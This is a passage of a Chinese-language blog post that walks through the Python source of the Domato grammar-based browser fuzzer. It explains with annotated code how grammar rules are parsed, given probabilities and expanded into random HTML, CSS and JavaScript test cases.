class="keyword">else</span>:</span><br><span class="line">        self._creators[create_tag_name] = [rule]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;nonrecursive&#x27;</span> <span class="keyword">in</span> rule[<span class="string">&#x27;creates&#x27;</span>]:</span><br><span class="line">        <span class="keyword">if</span> create_tag_name <span class="keyword">in</span> self._nonrecursive_creators:</span><br><span class="line">            self._nonrecursive_creators[create_tag_name].append(rule)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self._nonrecursive_creators[create_tag_name] = [rule]</span><br><span class="line">    self._all_rules.append(rule)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;root&#x27;</span> <span class="keyword">in</span> rule[<span class="string">&#x27;creates&#x27;</span>]:</span><br><span class="line">        self._root = create_tag_name</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h5 id="parse-code-line"><a href="#parse-code-line" class="headerlink" title="_parse_code_line"></a>_parse_code_line</h5><p>可以看到44-47行，会对 self._creators[‘line’]添加一些元素，这会对后面<code>_compute_interesting_indices</code>起作用，我们可以说如果在<code>self._creators[&#39;line&#39;]</code>中的元素可能是“有趣”的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_parse_code_line</span>(<span class="params">self, line, helper_lines=<span class="literal">False</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parses a rule for generating code.&quot;&quot;&quot;</span></span><br><span class="line">    rule = &#123;</span><br><span class="line">        <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;code&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;parts&#x27;</span>: [],</span><br><span class="line">        <span class="string">&#x27;creates&#x27;</span>: []</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># Splits the line into constant parts and tags. For example</span></span><br><span class="line">    <span class="comment"># &quot;foo&lt;bar&gt;baz&quot; would be split into three parts, &quot;foo&quot;, &quot;bar&quot; and &quot;baz&quot;</span></span><br><span class="line">    <span class="comment"># Every other part is going to be constant and every other part</span></span><br><span class="line">    <span class="comment"># is going to be a tag, always starting with a constant. Empty</span></span><br><span class="line">    <span class="comment"># spaces between tags/beginning/end are not a problem because</span></span><br><span class="line">    <span class="comment"># then empty strings will be returned in corresponding places,</span></span><br><span class="line">    <span class="comment"># for example &quot;&lt;foo&gt;&lt;bar&gt;&quot; gets split into &quot;&quot;, &quot;foo&quot;, &quot;&quot;, &quot;bar&quot;, &quot;&quot;</span></span><br><span class="line">    rule_parts = re.split(<span class="string">r&#x27;&lt;([^&gt;)]*)&gt;&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(rule_parts)):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> rule_parts[i]:</span><br><span class="line">                rule[<span class="string">&#x27;parts&#x27;</span>].append(&#123;</span><br><span class="line">                    <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;text&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;text&#x27;</span>: rule_parts[i]</span><br><span class="line">                &#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parsedtag = self._parse_tag_and_attributes(rule_parts[i])</span><br><span class="line">            rule[<span class="string">&#x27;parts&#x27;</span>].append(parsedtag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;new&#x27;</span> <span class="keyword">in</span> parsedtag:</span><br><span class="line">                rule[<span class="string">&#x27;creates&#x27;</span>].append(parsedtag)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> tag <span class="keyword">in</span> rule[<span class="string">&#x27;creates&#x27;</span>]:</span><br><span class="line">        tag_name = tag[<span class="string">&#x27;tagname&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> tag_name <span class="keyword">in</span> _NONINTERESTING_TYPES:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> tag_name <span class="keyword">in</span> self._creators:</span><br><span class="line">            self._creators[tag_name].append(rule)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self._creators[tag_name] = [rule]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;nonrecursive&#x27;</span> <span class="keyword">in</span> tag:</span><br><span class="line">            <span class="keyword">if</span> tag_name <span class="keyword">in</span> self._nonrecursive_creators:</span><br><span class="line">                self._nonrecursive_creators[tag_name].append(rule)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self._nonrecursive_creators[tag_name] = [rule]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> helper_lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;line&#x27;</span> <span class="keyword">in</span> self._creators:</span><br><span class="line">            self._creators[<span class="string">&#x27;line&#x27;</span>].append(rule)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self._creators[<span class="string">&#x27;line&#x27;</span>] = [rule]</span><br><span class="line"></span><br><span class="line">    self._all_rules.append(rule)</span><br></pre></td></tr></table></figure><h5 id="normalize-probabilities"><a href="#normalize-probabilities" class="headerlink" title="_normalize_probabilities"></a>_normalize_probabilities</h5><p>主要就是遍历了下<code>self._creators</code>与<code>self._nonrecursive_creators</code>，而它们在之前调用<code>_include_from_string</code>函数时被赋值了。遍历后调用<code>_get_cdf</code>来统计哪些tag使用了概率，并放入_creator_cdfs字典中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_normalize_probabilities</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Preprocessess probabilities for production rules.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Creates CDFs (cumulative distribution functions) and normalizes</span></span><br><span class="line"><span class="string">    probabilities in the [0,1] range for all creators. This is a</span></span><br><span class="line"><span class="string">    preprocessing function that makes subsequent creator selection</span></span><br><span class="line"><span class="string">    based on probability easier.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> symbol, creators <span class="keyword">in</span> self._creators.items():</span><br><span class="line">        cdf = self._get_cdf(symbol, creators)</span><br><span class="line">        self._creator_cdfs[symbol] = cdf<span class="comment"># 维护了一个字典_creator_cdfs，分别表示每个tag对应的概率分布。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> symbol, creators <span class="keyword">in</span> self._nonrecursive_creators.items():</span><br><span class="line">        cdf = self._get_cdf(symbol, creators)</span><br><span class="line">        self._nonrecursivecreator_cdfs[symbol] = cdf</span><br><span class="line">        </span><br><span class="line">        <span class="string">&quot;&quot;&quot; eg: 处理common.txt</span></span><br><span class="line"><span class="string">        _creator_cdfs = &#123;&#x27;newline&#x27;: [], &#x27;interestingint&#x27;: [], &#x27;fuzzint&#x27;: [], &#x27;short&#x27;: [1.0], &#x27;boolean&#x27;: [], &#x27;percentage&#x27;: [], &#x27;elementid&#x27;: [], &#x27;svgelementid&#x27;: [], &#x27;class&#x27;: [], &#x27;color&#x27;: [], &#x27;tagname&#x27;: [], &#x27;svgtagname&#x27;: [], &#x27;imgsrc&#x27;: [], &#x27;videosrc&#x27;: [], &#x27;audiosrc&#x27;: []&#125;</span></span><br><span class="line"><span class="string">        _nonrecursivecreator_cdfs = &#123;&#125;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h5 id="compute-interesting-indices"><a href="#compute-interesting-indices" class="headerlink" title="_compute_interesting_indices"></a>_compute_interesting_indices</h5><p>主要判断每个line是否有一些不”有趣“的特征，比如<code>type</code>不为<code>text</code>，<code>tagname</code>不在<code>_NONINTERESTING_TYPES</code>中等等，这块通过黑名单的方式进行实现，后续可以通过再添加黑名单进一步优化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_compute_interesting_indices</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="comment"># select interesting lines for each variable type</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;line&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> self._creators:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self._creators[<span class="string">&#x27;line&#x27;</span>])):</span><br><span class="line">        self._all_nonhelper_lines.append(i)</span><br><span class="line">        rule = self._creators[<span class="string">&#x27;line&#x27;</span>][i]</span><br><span class="line">        <span class="keyword">for</span> part <span class="keyword">in</span> rule[<span class="string">&#x27;parts&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> part[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;text&#x27;</span>:<span class="comment"># not intersting</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            tagname = part[<span class="string">&#x27;tagname&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> tagname <span class="keyword">in</span> _NONINTERESTING_TYPES:<span class="comment"># not intersting</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;new&#x27;</span> <span class="keyword">in</span> part:<span class="comment"># not intersting</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> tagname <span class="keyword">not</span> <span class="keyword">in</span> self._interesting_lines:</span><br><span class="line">                self._interesting_lines[tagname] = []</span><br><span class="line">            self._interesting_lines[tagname].append(i)</span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/domato101/image-20220118102602184.png" alt="image-20220118102602184"></p><h4 id="generate-symbol"><a href="#generate-symbol" class="headerlink" title="generate_symbol"></a>generate_symbol</h4><p>generate_symbol函数之前我们猜测是随机生成html和css代码的函数。我们跟入该函数去验证我们的猜想。</p><p>函数逻辑基本定义了个结构体之后调用了<code>_generate</code>函数，跟入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_symbol</span>(<span class="params">self, name</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Expands a symbol whose name is given as an argument.&quot;&quot;&quot;</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">&#x27;lastvar&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;lines&#x27;</span>: [],</span><br><span class="line">        <span class="string">&#x27;variables&#x27;</span>: &#123;&#125;,</span><br><span class="line">        <span class="string">&#x27;force_var_reuse&#x27;</span>: <span class="literal">False</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> self._generate(name, context, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><h5 id="generate"><a href="#generate" class="headerlink" title="_generate"></a>_generate</h5><p>首先检查我们是否已经有给定类型的变量（对应30行位置处的if判断）。而这段代码只有在生成js代码时才会调用，所以我们后续讨论。</p><p>之后调用了<code>_select_creator</code>和<code>_expand_rule</code>函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_generate</span>(<span class="params">self, symbol, context, recursion_depth=<span class="number">0</span>, force_nonrecursive=<span class="literal">False</span></span>):</span></span><br><span class="line">       <span class="string">&quot;&quot;&quot;生成用户定义的symbol.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       为给定符号选择规则并解析规则的右侧。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       Args:</span></span><br><span class="line"><span class="string">           symbol: 要被解析的符号名</span></span><br><span class="line"><span class="string">           context: 字典包括:</span></span><br><span class="line"><span class="string">               &#x27;lastvar&#x27;: 创建的最后一个变量的索引。</span></span><br><span class="line"><span class="string">               &#x27;lines&#x27;: 生成的代码行。（用于编程语言生成）。</span></span><br><span class="line"><span class="string">               &#x27;variables&#x27;: 包含迄今为止创建的所有变量名称的字典。</span></span><br><span class="line"><span class="string">           recursion_depth:当前递归深度。</span></span><br><span class="line"><span class="string">           force_nonrecursive: 是否强制只使用非递归规则。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       Returns:</span></span><br><span class="line"><span class="string">           包含符号扩展的字符串。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       Raises:</span></span><br><span class="line"><span class="string">           GrammarError: 如果语法描述不正确导致某些规则无法解析</span></span><br><span class="line"><span class="string">           RecursionError: 如果达到最大递归级别。</span></span><br><span class="line"><span class="string">       &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">       <span class="comment"># print symbol</span></span><br><span class="line"></span><br><span class="line">       <span class="comment"># print &#x27;Expanding &#x27; + symbol + &#x27; in depth &#x27; + str(recursion_depth)</span></span><br><span class="line"></span><br><span class="line">       force_var_reuse = context[<span class="string">&#x27;force_var_reuse&#x27;</span>]<span class="comment"># 强制变量重用</span></span><br><span class="line"></span><br><span class="line">       <span class="comment"># Check if we already have a variable of the given type.</span></span><br><span class="line">       <span class="keyword">if</span> (symbol <span class="keyword">in</span> context[<span class="string">&#x27;variables&#x27;</span>] <span class="keyword">and</span></span><br><span class="line">               symbol <span class="keyword">not</span> <span class="keyword">in</span> _NONINTERESTING_TYPES):</span><br><span class="line">           <span class="comment"># print symbol + &#x27;:&#x27; + str(len(context[&#x27;variables&#x27;][symbol])) + &#x27;:&#x27; + str(force_var_reuse)</span></span><br><span class="line">           <span class="keyword">if</span> (force_var_reuse <span class="keyword">or</span></span><br><span class="line">                   random.random() &lt; self._var_reuse_prob <span class="keyword">or</span></span><br><span class="line">                   <span class="built_in">len</span>(context[<span class="string">&#x27;variables&#x27;</span>][symbol]) &gt; self._max_vars_of_same_type):</span><br><span class="line">               <span class="comment"># print &#x27;reusing existing var of type &#x27; + symbol</span></span><br><span class="line">               context[<span class="string">&#x27;force_var_reuse&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">               variables = context[<span class="string">&#x27;variables&#x27;</span>][symbol]</span><br><span class="line">               <span class="keyword">return</span> variables[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(variables) - <span class="number">1</span>)]</span><br><span class="line">               <span class="comment"># print &#x27;Not reusing existing var of type &#x27; + symbol</span></span><br><span class="line"></span><br><span class="line">       creator = self._select_creator(</span><br><span class="line">           symbol,</span><br><span class="line">           recursion_depth,</span><br><span class="line">           force_nonrecursive</span><br><span class="line">       )</span><br><span class="line">       <span class="keyword">return</span> self._expand_rule(</span><br><span class="line">           symbol,</span><br><span class="line">           creator,</span><br><span class="line">           context,</span><br><span class="line">           recursion_depth,</span><br><span class="line">           force_nonrecursive</span><br><span class="line">       )</span><br></pre></td></tr></table></figure><p>首先看下<code>_select_creator</code>的代码逻辑。</p><h5 id="select-creator"><a href="#select-creator" class="headerlink" title="_select_creator"></a>_select_creator</h5><p>前面做了一些简单的判断，传入的<code>symbol</code>一定要被识别为已知类型，否则程序将无法生成代码（第20行）；判断了递归深度不能溢出；之后根据force_nonrecursive判断是否强制非递归，并添加到不同的数组中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_select_creator</span>(<span class="params">self, symbol, recursion_depth, force_nonrecursive</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;选择给定符号的creator。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    creator基于语法中指定的概率，或者如果未指定概率则均匀分布。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        symbol: 要获取其creator规则的符号的名称</span></span><br><span class="line"><span class="string">        recursion_depth: 当前递归深度</span></span><br><span class="line"><span class="string">        force_nonrecursive: 如果为 True，则仅使用标记为“非递归”的creator（如果可用）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        描述可以创建给定符号的规则的字典。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Raises:</span></span><br><span class="line"><span class="string">        RecursionError: 如果达到最大递归级别。</span></span><br><span class="line"><span class="string">        GrammarError: 如果没有创建给定类型的规则。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Do we even know how to create this type?</span></span><br><span class="line">    <span class="keyword">if</span> symbol <span class="keyword">not</span> <span class="keyword">in</span> self._creators:</span><br><span class="line">        <span class="keyword">raise</span> GrammarError(<span class="string">&#x27;No creators for type &#x27;</span> + symbol)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> recursion_depth &gt;= self._recursion_max:</span><br><span class="line">        <span class="keyword">raise</span> RecursionError(</span><br><span class="line">            <span class="string">&#x27;Maximum recursion level reached while creating &#x27;</span></span><br><span class="line">            <span class="string">&#x27;object of type&#x27;</span> + symbol</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">elif</span> force_nonrecursive <span class="keyword">and</span> symbol <span class="keyword">in</span> self._nonrecursive_creators:</span><br><span class="line">        creators = self._nonrecursive_creators[symbol]</span><br><span class="line">        cdf = self._nonrecursivecreator_cdfs[symbol]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        creators = self._creators[symbol]</span><br><span class="line">        cdf = self._creator_cdfs[symbol]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cdf:</span><br><span class="line">        <span class="comment"># Uniform distribution, faster</span></span><br><span class="line">        <span class="keyword">return</span> creators[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(creators) - <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Select a creator according to the cdf</span></span><br><span class="line">    idx = bisect.bisect_left(cdf, random.random(), <span class="number">0</span>, <span class="built_in">len</span>(cdf))</span><br><span class="line">    <span class="keyword">return</span> creators[idx]</span><br></pre></td></tr></table></figure><h5 id="expand-rule"><a href="#expand-rule" class="headerlink" title="_expand_rule"></a>_expand_rule</h5><p>由于语法规则中有些右侧元素索引着其他元素，那么需要使用这个函数将其扩展，这样做的目的是为了语法简便。</p><p>在生成html和css代码时其实不会执行到最后的代码段，核心点在于调用_generate函数，而_generate函数也调用了该_expand_rule函数，二者存递归调用，将右侧的元素完全展开。</p><p>随机生成的结果通过ret_parts保存，最后拼接得到最终结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_expand_rule</span>(<span class="params">self, symbol, rule, context,</span></span></span><br><span class="line"><span class="params"><span class="function">                 recursion_depth, force_nonrecursive</span>):</span></span><br><span class="line">   <span class="string">&quot;&quot;&quot;扩展给定的规则。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    遍历规则右侧的所有元素，将它们替换为它们的字符串表示或递归调用 _Generate() 以获取其他非终结符号。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">        符号：正在解析的符号的名称。</span></span><br><span class="line"><span class="string">        规则：将用于扩展符号的生产规则。</span></span><br><span class="line"><span class="string">        上下文：字典包括：</span></span><br><span class="line"><span class="string">            &#x27;lastvar&#x27;：创建的最后一个变量的索引。</span></span><br><span class="line"><span class="string">            &#x27;lines&#x27;：生成的代码行</span></span><br><span class="line"><span class="string">                （用于编程语言生成）。</span></span><br><span class="line"><span class="string">            &#x27;variables&#x27;：包含所有名称的字典</span></span><br><span class="line"><span class="string">                到目前为止创建的变量。</span></span><br><span class="line"><span class="string">        recursion_depth：当前递归深度</span></span><br><span class="line"><span class="string">        force_nonrecursive：是否强制只使用非递归规则。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    回报：</span></span><br><span class="line"><span class="string">        包含符号扩展的字符串。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    提高：</span></span><br><span class="line"><span class="string">        GrammarError：如果语法描述不正确导致某些规则无法解析</span></span><br><span class="line"><span class="string">        RecursionError：如果达到最大递归级别。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                expanded = self._generate(</span><br><span class="line">                    part[<span class="string">&#x27;tagname&#x27;</span>],</span><br><span class="line">                    context,</span><br><span class="line">                    recursion_depth + <span class="number">1</span>,</span><br><span class="line">                    force_nonrecursive</span><br><span class="line">                )</span><br><span class="line">            <span class="keyword">except</span> RecursionError <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> force_nonrecursive:</span><br><span class="line">                    expanded = self._generate(</span><br><span class="line">                        part[<span class="string">&#x27;tagname&#x27;</span>],</span><br><span class="line">                        context,</span><br><span class="line">                        recursion_depth + <span class="number">1</span>,</span><br><span class="line">                        <span class="literal">True</span></span><br><span class="line">                    )</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span> RecursionError(e)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;id&#x27;</span> <span class="keyword">in</span> part:</span><br><span class="line">            variable_ids[part[<span class="string">&#x27;id&#x27;</span>]] = expanded</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;beforeoutput&#x27;</span> <span class="keyword">in</span> part:</span><br><span class="line">            expanded = self._exec_function(</span><br><span class="line">                part[<span class="string">&#x27;beforeoutput&#x27;</span>],</span><br><span class="line">                part,</span><br><span class="line">                context,</span><br><span class="line">                expanded</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        ret_parts.append(expanded)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add all newly created variables to the context</span></span><br><span class="line">    additional_lines = []</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> new_vars:</span><br><span class="line">        <span class="keyword">if</span> v[<span class="string">&#x27;type&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> _NONINTERESTING_TYPES:</span><br><span class="line">            self._add_variable(v[<span class="string">&#x27;name&#x27;</span>], v[<span class="string">&#x27;type&#x27;</span>], context)</span><br><span class="line">            additional_lines.append(<span class="string">&quot;if (!&quot;</span> + v[<span class="string">&#x27;name&#x27;</span>] + <span class="string">&quot;) &#123; &quot;</span> + v[<span class="string">&#x27;name&#x27;</span>] + <span class="string">&quot; = GetVariable(fuzzervars, &#x27;&quot;</span> + v[<span class="string">&#x27;type&#x27;</span>] + <span class="string">&quot;&#x27;); &#125; else &#123; &quot;</span> + self._get_variable_setters(v[<span class="string">&#x27;name&#x27;</span>], v[<span class="string">&#x27;type&#x27;</span>]) + <span class="string">&quot; &#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Return the result.</span></span><br><span class="line">    <span class="comment"># In case of &#x27;ordinary&#x27; grammar rules, return the filled rule.</span></span><br><span class="line">    <span class="comment"># In case of code, return just the variable name</span></span><br><span class="line">    <span class="comment"># and update the context</span></span><br><span class="line">    filed_rule = <span class="string">&#x27;&#x27;</span>.join(ret_parts)</span><br><span class="line">    <span class="keyword">if</span> rule[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;grammar&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> filed_rule</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        context[<span 